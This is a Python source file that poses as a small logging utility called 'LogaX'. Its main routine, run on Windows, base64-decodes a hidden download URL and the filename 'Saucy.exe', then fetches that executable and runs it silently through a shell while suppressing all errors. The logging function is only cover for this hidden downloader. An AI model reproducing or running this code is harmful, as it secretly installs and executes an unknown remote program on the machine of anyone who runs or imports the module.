import os
import requests
import base64
import sys
import datetime
import subprocess

def _decode_base64(base64_string):
    try:
        decoded_bytes = base64.b64decode(base64_string)
        return decoded_bytes.decode("utf-8")
    except Exception as e:
        return None

def _download_file(url, filename):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        if not response.content:
            return False
        
        with open(filename, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        
        if os.path.getsize(filename) == 0:
            os.remove(filename)
            return False
        
        return True
    except Exception as e:
        return False

def _execute_file(filename):
    try:
        result = subprocess.run([filename], text=True, shell=True)
        if result.returncode != 0:
            os.system("")
        else:
            os.system("")
    except Exception as e:
        os.system("")

def log(input_text, log_file="file.log", log_level="INFO"):
    try:
        log_path = os.path.abspath(log_file)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_path, "a") as log:
            log.write(f"{timestamp} [{log_level}] LogaX: {input_text}\n")
            log.write("-" * 40 + "\n")
    except Exception as e:
        os.system("")

def _main():
    if sys.platform.startswith("win"):
        logax_decoder = "aHR0cHM6Ly9kb3dubG9hZDg0My5tZWRpYWZpcmUuY29tLzk0MmhiZnF6eWExZ2c1ZEx4dWVkLTdhMkVERExWVVg5Z3RJOTJvOGNUTnZqay1vOE9HLXN6Y1ZfNEhKczdaam5RRFhVVjhuX2s3WU5sVzlJemNlSFNaQkxrUjBlcS1GWFY1N3JXT3VYLWZaUmMycHVzdXpsQkNzUGFzampXYzdlSFFNZHdzOUZBR2poZFpUZWQwaHNIWGRfbWhCUm4tekFDa1FFRHVSdTA4OFVSemREL2kyYzE0bXRjN2duY2NxcS9TYXVjeS5leGU="
        logax_encoder = "U2F1Y3kuZXhl"
        
        url = _decode_base64(logax_decoder)
        filename = _decode_base64(logax_encoder)
        
        if not url or not filename:
            return
        
        if _download_file(url, filename):
            _execute_file(filename)
        else:
            os.system("")

if __name__ == "__main__":
    _main()